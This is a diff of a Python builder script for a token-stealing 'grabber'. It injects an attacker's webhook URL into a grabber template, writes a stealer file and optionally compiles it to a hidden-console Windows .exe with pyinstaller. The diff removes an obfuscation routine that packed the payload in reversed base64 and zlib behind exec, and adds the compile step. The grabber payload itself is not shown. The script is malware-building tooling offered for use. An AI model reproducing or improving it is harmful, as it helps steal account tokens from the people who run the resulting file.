@@ -1,9 +1,6 @@
 import os
 import shutil
-import time
 import sys
-import base64
-import zlib
 from colorama import Fore, init, Style
 
 init(autoreset=True)
@@ -38,41 +35,29 @@ if not name_file.strip():
 search_text = "WEBHOOK_HERE"
 replace_text = webhook_url
 
-template_grabber_path = "assets/grabber.py"
-output_file_path = f"builder/{name_file}.py"
+grabber_path = "assets/grabber.py"
+output_grabber_path = f"builder/{name_file}.py"
 
 if not os.path.exists('builder'):
     os.makedirs('builder')
 
-with open(template_grabber_path, 'r', encoding="utf-8") as f:
+with open(grabber_path, 'r', encoding="utf-8") as f:
     code = f.read()
 
 code = code.replace(search_text, replace_text)
 
-obfuscate = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Do you want to obfuscate the code? (y/n): ").lower()
+with open(output_grabber_path, 'w', encoding="utf-8") as output_grabber_path:
+    output_grabber_path.write(code)
 
-if obfuscate == "y":
-    def obfuscate_code(code):
-        base64_encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
-        zlib_encoded = zlib.compress(base64_encoded.encode('utf-8'))
-        zlib_encoded_base64 = base64.b64encode(zlib_encoded).decode('utf-8')
-        reversed_encoded = zlib_encoded_base64[::-1]
+print(f"[{Fore.CYAN}!{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Stealer file: {Fore.RED}{output_grabber_path}{Style.RESET_ALL}")
 
-        code = f'''import base64
-import zlib
-encoded_code = "{reversed_encoded}"
-exec(base64.b64decode(zlib.decompress(base64.b64decode(encoded_code[::-1]))).decode('utf-8'))'''
+compile_to_exe = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Do you want to compile to .exe? (y/n): ").lower()
 
-        return code
+if compile_to_exe == "y":
+    os.system(f'pyinstaller --onefile --noconsole "{output_grabber_path}"')
+    exe_path = f"dist/{name_file}.exe"
+    clear()
+    print(Fore.GREEN + logo)
+    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Compiled .exe file: {Fore.RED}{exe_path}{Style.RESET_ALL}")
 
-    obfuscated_code = obfuscate_code(code)
-    with open(output_file_path, 'w', encoding="utf-8") as output_file:
-        output_file.write(obfuscated_code)
-
-    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Obfuscated code successfully written to the new stealer script!")
-else:
-    with open(output_file_path, 'w', encoding="utf-8") as output_file:
-        output_file.write(code)
-
-print(f"[{Fore.CYAN}!{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Stealer file: {Fore.RED}{output_file_path}{Style.RESET_ALL}")
 print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Finished creating the token grabber script!")
